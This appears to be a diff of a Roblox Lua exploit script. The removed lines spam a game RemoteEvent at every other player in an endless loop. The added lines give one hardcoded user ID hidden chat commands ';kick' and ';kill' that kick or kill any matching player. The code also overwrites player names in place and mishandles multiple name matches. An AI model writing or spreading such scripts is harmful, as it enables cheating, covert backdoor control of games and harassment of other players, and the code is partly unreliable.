@@ -1,9 +1,62 @@
-while wait() do
-game:GetService("ReplicatedStorage").RemoteEvent:FireServer(16, "public")
-wait()
-for i,v in pairs(game.Players:GetPlayers()) do
-if v.Name ~= game.Players.LocalPlayer.Name then
-game:GetService("ReplicatedStorage").RemoteEvent:FireServer(30, v)
+-- init, made by xaxa (for ov3rp0wered)
+repeat wait() until game:IsLoaded()
+
+-- variables
+local Players = game.GetService(game, "Players")
+local Client = Players.LocalPlayer
+
+local AdminPrefix, AdminTable = ";", {
+    [155470461] = {
+        Permission = 5,
+    },
+}
+
+-- functions 
+function GetPlayersName(Player)
+    if not Player then return end 
+    Player = string.lower(Player)
+    
+    local PlayerTable = {}
+    
+    for _, v in next, Players:GetPlayers() do 
+        v.Name = string.lower(v.Name)
+        v.DisplayName = string.lower(v.DisplayName)
+        
+        if string.sub(v.Name, 1, string.len(Player)) == Player or string.sub(v.DisplayName, 1, string.len(Player)) == Player then 
+            PlayerTable[#PlayerTable + 1] = v
+        end 
+    end
+    
+    if #PlayerTable > 0 then 
+        return unpack(PlayerTable)
+    end
 end
+
+function PlayerChattedEvent(Player, Message)
+    if not (Player or Message) then return end 
+    Message = string.lower(Message)
+    
+    if string.sub(Message, 1, string.len(AdminPrefix)) == AdminPrefix then 
+        local Arguments = string.split(string.sub(Message, string.len(AdminPrefix) + 1), " ")
+        
+        if Arguments[1] == "kick" and (Arguments[2] and GetPlayersName(Arguments[2])) and Arguments[3] then 
+            GetPlayersName(Arguments[2]).Kick(GetPlayersName(Arguments[2]), Arguments[3])
+        elseif Arguments[1] == "kill" and (Arguments[2] and GetPlayersName(Arguments[2])) then 
+            GetPlayersName(Arguments[2]).Character.BreakJoints(GetPlayersName(Arguments[2]).Character)
+        end
+    end
 end
+
+function HandlerPlayerIdentifiers(Player)
+    if Player and AdminTable[Player.UserId] then 
+        Player.Chatted:Connect(function(Message)
+            PlayerChattedEvent(Player, Message)
+        end)
+    end
 end
+
+-- end 
+for _, v in next, Players:GetPlayers() do 
+    HandlerPlayerIdentifiers(v)
+end
+Players.PlayerAdded:Connect(HandlerPlayerIdentifiers)
